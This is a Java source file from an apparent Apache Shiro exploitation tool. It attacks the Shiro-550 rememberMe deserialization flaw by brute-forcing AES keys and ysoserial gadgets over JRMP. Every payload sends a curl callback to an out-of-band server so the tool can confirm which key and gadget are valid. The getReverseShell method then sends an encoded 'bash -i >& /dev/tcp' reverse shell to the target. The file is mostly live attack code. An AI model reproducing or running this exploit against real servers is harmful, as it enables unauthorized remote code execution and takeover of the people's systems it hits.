package com.shiroExploit.vulnverifier;

import com.shiroExploit.core.AesEncrypt;
import com.shiroExploit.util.*;
import org.apache.commons.codec.binary.Base64;
import java.io.File;
import java.io.IOException;
import java.util.*;

public class Shiro550VerifiertWithJRMP implements Verifier {
    private Config config;
    private String key;
    private List<PayloadType> gadgets;

    public Shiro550VerifiertWithJRMP(){
        System.out.println("[*] Using Shiro550VerifiertWithJRMP");
        this.config = Config.getInstance();
        this.gadgets = new ArrayList<>();
    }


    @Override
    public void getValidGadget() throws ExploitFailedException {
        sendAllCurlPayloadsWithAllKeys();
    }

    @Override
    public void getReverseShell(){
        String str = "bash -i >& /dev/tcp/" + config.getReverseShellIP() + "/" + config.getReverseShellPort() + " 0>&1";
        String base64 = Base64.encodeBase64String(str.getBytes());
        String cmd = "bash -c {echo," + base64 + "}|{base64,-d}|{bash,-i}";

        for(PayloadType type : this.gadgets){
            Tools.setJRMPServer(config.getOOBServerAddress(), config.getHTTPServicePort(), type, cmd);

            String command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar JRMPClient " + config.getOOBServerAddress() + ":" + config.getJRMPServicePort();
            byte[] payload = Tools.exec(command);
            String rememberMe = AesEncrypt.encrypt(this.key, payload);
            System.out.println("[+] 反弹Shell payload：");
            System.out.println("rememberMe=" + rememberMe);
            HttpRequest.request(config.getTargetURL(), rememberMe);
        }
    }


    private void sendAllCurlPayloadsWithAllKeys() throws ExploitFailedException {
        boolean flag = false;

        for(PayloadType payloadType : PayloadType.values()){
            Map<String, String> map = new HashMap<>();
            System.out.println("[*] Trying Gadget: " + payloadType.getName());

            for(String key : config.getKyes()){
                String uuid = UUID.randomUUID().toString().replaceAll("-", "");
                String command = "curl http://" + config.getOOBServerAddress() + ":" + config.getHTTPServicePort() + "/gadget?uuid=" + uuid + "&type=" + payloadType.getName();
                Tools.setJRMPServer(config.getOOBServerAddress(), config.getHTTPServicePort(), payloadType, command);

                command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar JRMPClient " + config.getOOBServerAddress() + ":" + config.getJRMPServicePort();
                byte[] payload = Tools.exec(command);
                String rememberMe = AesEncrypt.encrypt(key, payload);
                HttpRequest.request(config.getTargetURL(), rememberMe);
                map.put(uuid, key + ":" + payloadType.getName());
            }

            if(findValidGadget(map)){
                flag = true;
                if(config.isSkipIfFound()){
                    break;
                }
            }
        }

        if(!flag){
            throw new ExploitFailedException("[-] Can not find a valid key or valid gadget");
        }
    }

    private boolean findValidGadget(Map<String,String> map){
        try{
            Thread.sleep(config.getDelay() * 1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        String url = "http://" + config.getOOBServerAddress() + ":" + config.getHTTPServicePort() + "/result";
        String result = null;
        try {
            result = HttpRequest.request(url);
        } catch (IOException e) {
            e.printStackTrace();
        }
        String[] uuids = result.trim().split(",");
        Set<String> validUUID = new HashSet<>(Arrays.asList(uuids));
        Set<String> keys = map.keySet();

        //取交集的目的是防止可能的多次请求造成的错误
        validUUID.retainAll(keys);

        if(validUUID.size() == 0){
            return false;
        }

        for(String str : validUUID){
            String temp = map.get(str);
            String[] pair = temp.split(":");
            this.key = pair[0];
            PayloadType type = getType(pair[1]);
            this.gadgets.add(type);
        }

        System.out.println("[+] Find Valid Key: " + this.key);
        for(PayloadType type : this.gadgets){
            System.out.println("[+] Find Valid Gadget: " + type.getName());
        }

        return true;
    }

    public PayloadType getType(String name){
        for(PayloadType type : PayloadType.values()) {
            if(type.getName().equalsIgnoreCase(name)){
                return type;
            }
        }

        return null;
    }
}
